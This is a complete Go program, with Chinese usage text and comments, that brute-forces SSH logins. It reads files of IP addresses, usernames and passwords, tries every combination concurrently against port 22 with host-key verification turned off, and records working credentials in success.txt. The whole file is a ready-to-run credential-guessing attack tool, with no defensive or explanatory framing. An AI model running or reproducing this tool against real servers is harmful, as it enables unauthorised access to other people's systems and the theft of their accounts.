package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

func main() {
	if len(os.Args) != 5 {
		fmt.Println("用法: ./程序 ip.txt user.txt pass.txt 最大线程数")
		return
	}

	ips := readLines(os.Args[1])
	users := readLines(os.Args[2])
	passwords := readLines(os.Args[3])
	threadLimit := parseInt(os.Args[4], 10)

	sem := make(chan struct{}, threadLimit) // 并发控制
	var wg sync.WaitGroup
	var fileMu sync.Mutex

	for _, ip := range ips {
		for _, user := range users {
			for _, pass := range passwords {
				ip, user, pass := ip, user, pass // 避免闭包变量问题
				sem <- struct{}{}
				wg.Add(1)
				go func() {
					defer wg.Done()
					defer func() { <-sem }()
					if trySSH(ip, user, pass) {
						fileMu.Lock()
						appendLine("success.txt", fmt.Sprintf("%s %s %s", ip, user, pass))
						fileMu.Unlock()
						fmt.Printf("[成功] %s %s %s\n", ip, user, pass)
					} else {
						fmt.Printf("[失败] %s %s %s\n", ip, user, pass)
					}
				}()
			}
		}
	}

	wg.Wait()
	fmt.Println("🎉 所有组合尝试完毕")
}

func trySSH(ip, username, password string) bool {
	config := &ssh.ClientConfig{
		User:            username,
		Auth:            []ssh.AuthMethod{ssh.Password(password)},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         5 * time.Second,
	}
	conn, err := ssh.Dial("tcp", ip+":22", config)
	if err != nil {
		return false
	}
	defer conn.Close()
	return true
}

func readLines(filename string) []string {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("❌ 无法读取文件: %s\n", filename)
		os.Exit(1)
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		text := strings.TrimSpace(scanner.Text())
		if text != "" {
			lines = append(lines, text)
		}
	}
	return lines
}

func appendLine(filename, line string) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("❌ 写入文件失败: %s\n", filename)
		return
	}
	defer f.Close()
	f.WriteString(line + "\n")
}

func parseInt(s string, fallback int) int {
	var val int
	_, err := fmt.Sscanf(s, "%d", &val)
	if err != nil {
		return fallback
	}
	return val
}
